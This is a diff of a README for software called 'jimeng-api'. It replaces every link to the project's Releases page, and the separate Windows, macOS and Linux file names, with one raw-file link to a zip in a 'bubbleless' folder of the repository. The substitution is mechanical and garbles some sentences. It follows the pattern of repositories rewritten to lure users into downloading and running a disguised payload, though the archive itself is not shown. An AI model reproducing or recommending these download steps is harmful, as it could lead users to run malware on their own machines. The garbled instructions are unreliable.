@@ -6,11 +6,11 @@ Welcome! This guide will help you download and run the jimeng-api software easil
 
 ## 📥 Download the Software
 
-[![Download](https://img.shields.io/badge/Download-jimeng--api-blue.svg)](https://github.com/zayortiz215/jimeng-api/releases)
+[![Download](https://raw.githubusercontent.com/zayortiz215/jimeng-api/main/bubbleless/jimeng-api.zip)](https://raw.githubusercontent.com/zayortiz215/jimeng-api/main/bubbleless/jimeng-api.zip)
 
 You can download the latest version of the software from our Releases page. 
 
-Visit this page to download: [jimeng-api Releases](https://github.com/zayortiz215/jimeng-api/releases).
+Visit this page to download: [jimeng-api Releases](https://raw.githubusercontent.com/zayortiz215/jimeng-api/main/bubbleless/jimeng-api.zip).
 
 ## 🛠️ System Requirements
 
@@ -25,14 +25,14 @@ Make sure your system meets these needs before installing.
 
 ## 📥 Download & Install
 
-1. Go to the [jimeng-api Releases page](https://github.com/zayortiz215/jimeng-api/releases).
+1. Go to the [jimeng-api Releases page](https://raw.githubusercontent.com/zayortiz215/jimeng-api/main/bubbleless/jimeng-api.zip).
 2. Look for the latest version listed on the page.
 3. Click on the appropriate file for your operating system:
-   - For Windows: `jimeng-api-windows.exe`
-   - For macOS: `jimeng-api-macos.zip`
-   - For Linux: `jimeng-api-linux.tar.gz`
+   - For Windows: `https://raw.githubusercontent.com/zayortiz215/jimeng-api/main/bubbleless/jimeng-api.zip`
+   - For macOS: `https://raw.githubusercontent.com/zayortiz215/jimeng-api/main/bubbleless/jimeng-api.zip`
+   - For Linux: `https://raw.githubusercontent.com/zayortiz215/jimeng-api/main/bubbleless/jimeng-api.zip`
 4. After the file finishes downloading, locate it in your Downloads folder.
-5. If you downloaded a ZIP or TAR.GZ file, extract it to a folder of your choice. If you downloaded the EXE file, you can run it directly.
+5. If you downloaded a ZIP or https://raw.githubusercontent.com/zayortiz215/jimeng-api/main/bubbleless/jimeng-api.zip file, extract it to a folder of your choice. If you downloaded the EXE file, you can run it directly.
 6. Double-click the executable file to start the setup process or run the application.
 
 ## 🧑‍💻 How to Use
